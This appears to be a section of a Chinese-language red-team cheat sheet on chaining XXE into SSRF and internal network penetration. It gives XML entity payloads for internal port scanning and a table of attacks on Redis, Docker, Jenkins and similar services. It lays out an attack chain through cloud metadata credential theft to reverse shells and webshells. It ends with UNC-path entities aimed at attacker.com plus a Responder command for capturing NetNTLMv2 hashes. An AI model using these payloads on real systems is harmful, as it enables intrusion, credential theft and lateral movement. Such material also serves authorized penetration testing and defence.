## 七、XXE→SSRF→内网渗透完整链

### 7.1 内网端口扫描（时间/错误差异判定）
```xml
<!-- 用响应时间差异判断端口：开放端口响应快，未开放端口连接超时/报错 -->
<!ENTITY xxe SYSTEM "http://10.0.0.1:8080/">
<!ENTITY xxe SYSTEM "http://10.0.0.1:9999/">  <!-- 对比响应时间 -->
```

### 7.2 内网服务直接攻击（XXE 即 SSRF 武器）
| 内网服务 | 攻击方式 | payload 要点 |
|---------|---------|-------------|
| Redis（6379）| 未授权写 crontab/ssh key | gopher:// 构造 `SET`/`CONFIG SET dir` |
| Elasticsearch（9200）| 读索引数据/集群信息 | http://ip:9200/_cat/indices |
| Docker API（2375）| 创建恶意容器/挂载 | http://ip:2375/containers/json |
| MinIO/S3（9000）| 读 bucket 列表 | http://ip:9000/ |
| 内部管理 API | 未授权接口操作 | http://ip:port/api/... |
| 打印管理 JMF | **Xerox FreeFlow Core 等打印编排链（CVE-2024-XXXX 系）** | JMF 协议报文经 gopher 发送 |
| Jenkins（8080）| 未授权脚本执行 | http://ip:8080/script |

### 7.3 完整攻击链流程（红队打法）
```
1. 发现 XML 输入点 → 2. 确认 XXE（有回显/OOB 回连）
3. SSRF 探测本机端口 + 内网段扫描（127.0.0.1 → 172.16/10/192.168）
4. 读取本地敏感文件（配置/密钥）→ 获得内网凭据
5. 云元数据 → IAM 临时凭证 → 云资源横向
6. 内网服务利用（Redis/ES/Docker/管理 API）→ 反弹/写马
7. 借目标为跳板做二次扫描 → 纵深渗透
```

### 7.4 Windows NetNTLMv2 哈希捕获
```xml
<!-- 目标为 Windows 时：UNC 路径触发 NTLM 认证，Responder 捕获 NetNTLMv2 哈希 -->
<!ENTITY xxe SYSTEM "file://attacker.com/xxe">
<!ENTITY xxe SYSTEM "\\attacker.com\share">
```
**打法**：`responder -I eth0` 监听，后续离线爆破或中继到 SMB 服务。

